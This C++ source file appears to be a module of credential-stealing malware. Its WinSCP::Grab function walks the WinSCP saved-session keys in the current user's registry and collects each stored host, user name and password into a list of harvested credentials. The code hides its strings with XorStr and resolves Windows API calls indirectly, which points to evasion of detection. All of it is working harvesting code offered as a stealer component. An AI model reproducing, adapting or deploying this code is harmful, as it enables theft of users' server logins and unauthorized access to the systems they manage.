#include "Common.h"

vector<PassData> WinSCP::Grab()
{
	const string winscp_path = XorStr("Software\\Martin Prikryl\\WinSCP 2\\Sessions");
	vector<PassData> passData;

	HKEY key;
	API(ADVAPI32, RegOpenKeyA)(HKEY_CURRENT_USER, winscp_path.c_str(), &key);
	if (!key) return passData;

	char buff[1024];
	DWORD index = 0;
	LSTATUS stat = API(ADVAPI32, RegEnumKeyA)(key, index, buff, 1024);
	while (stat == ERROR_SUCCESS)
	{
		HKEY full_key;
		API(ADVAPI32, RegOpenKeyA)(HKEY_CURRENT_USER, (winscp_path + '\\' + (string)buff).c_str(), &full_key);
		if (full_key != nullptr)
		{
			string host, login, password;
			Utils::GetStringRegKeyW(full_key, XorStr("HostName"), host, string());
			Utils::GetStringRegKeyW(full_key, XorStr("UserName"), login, string());
			Utils::GetStringRegKeyW(full_key, XorStr("Password"), password, string());

			if (!host.empty() && !login.empty())
			{
				PassData temp;
				temp.Soft = XorStr("WinSCP");
				temp.Host = host;
				temp.Login = login;
				temp.Pass = password;
				passData.push_back(temp);
			}
		}

		index++;
		API(ADVAPI32, RegCloseKey)(full_key);

		stat = API(ADVAPI32, RegEnumKeyA)(key, index, buff, 1024);
	}
	API(ADVAPI32, RegCloseKey)(key);

	return passData;
}